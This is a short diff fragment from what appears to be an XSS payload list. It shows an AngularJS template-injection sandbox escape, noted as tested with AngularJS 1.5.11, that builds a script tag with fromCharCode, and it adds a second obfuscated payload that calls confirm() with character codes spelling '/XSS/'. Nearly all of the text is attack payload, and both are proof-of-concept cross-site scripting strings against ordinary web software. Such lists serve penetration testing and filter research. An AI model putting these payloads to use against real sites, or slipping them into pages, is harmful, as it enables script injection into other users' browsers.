@@ -66,3 +66,8 @@ Tested with AngularJS 1.5.11 (payload: <script>alert(1);</script>)
 
 	{{valueOf.name.constructor.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,59,60,47,115,99,114,105,112,116,62)}}
 
+------
+  
+  c=String.fromCharCode;confirm(c(47)+c(88)+c(83)+c(83)+c(47))
+
+
